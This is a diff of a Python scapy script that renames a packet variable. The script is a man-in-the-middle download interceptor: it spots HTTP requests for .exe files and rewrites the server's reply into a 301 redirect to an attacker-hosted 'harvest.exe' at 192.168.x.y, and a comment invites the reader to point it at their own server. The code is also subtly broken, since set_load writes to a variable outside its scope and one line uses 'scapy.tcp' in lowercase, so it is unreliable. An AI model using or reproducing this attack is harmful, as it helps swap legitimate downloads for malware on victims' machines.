@@ -6,27 +6,27 @@ ack_list = []
 
 
 def set_load(packet, load):
-    my_packet[scapy.Raw].load = load
-    del my_packet[scapy.IP].len
-    del my_packet[scapy.IP].chksum
-    del my_packet[scapy.TCP].chksum
+    http_packet[scapy.Raw].load = load
+    del http_packet[scapy.IP].len
+    del http_packet[scapy.IP].chksum
+    del http_packet[scapy.TCP].chksum
     return packet
 
 
 def process_packet(packet):
-    my_packet = scapy.IP(packet.get_payload())
-    if my_packet.haslayer(scapy.Raw):
-        if my_packet[scapy.TCP].dport == 80:
-            ack_list.append(my_packet[scapy.tcp].ack)
-            if ".exe" in my_packet[scapy.Raw].load.decode():
+    http_packet = scapy.IP(packet.get_payload())
+    if http_packet.haslayer(scapy.Raw):
+        if http_packet[scapy.TCP].dport == 80:
+            ack_list.append(http_packet[scapy.tcp].ack)
+            if ".exe" in http_packet[scapy.Raw].load.decode():
                 print("[+] .exe Request file requested")
 
-        elif my_packet[scapy.TCP].sport == 80:
-            if my_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(my_packet[scapy.TCP].seq)
+        elif http_packet[scapy.TCP].sport == 80:
+            if http_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(http_packet[scapy.TCP].seq)
                 print("[+] Replacing download file...")
-                modified_packet = set_load(my_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
-                                                      "https://192.168.x.y/havesters/harvest.exe\n ")
+                modified_packet = set_load(http_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
+                                                        "https://192.168.x.y/havesters/harvest.exe\n ")
                 #  replace the destination link/location with your own(could point to a file in your own pc's server)
 
                 packet.set_payload(bytes(modified_packet))
